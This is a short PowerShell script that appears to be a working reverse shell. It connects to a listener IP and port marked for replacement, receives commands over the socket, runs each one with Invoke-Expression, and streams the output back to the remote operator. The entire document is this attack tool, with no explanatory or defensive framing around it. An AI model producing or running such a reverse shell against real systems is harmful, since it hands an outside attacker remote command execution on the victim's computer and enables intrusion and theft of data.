$ip = '172.20.10.5 '       # Replace with your listener IP
$port = 4444              # Replace with your listener port

$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$buffer = New-Object byte[] 1024

while (($read = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $command = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $read)
    try {
        $output = iex $command 2>&1 | Out-String
    } catch {
        $output = $_.Exception.Message
    }
    $writer.Write($output)
    $writer.Flush()
}

$client.Close()
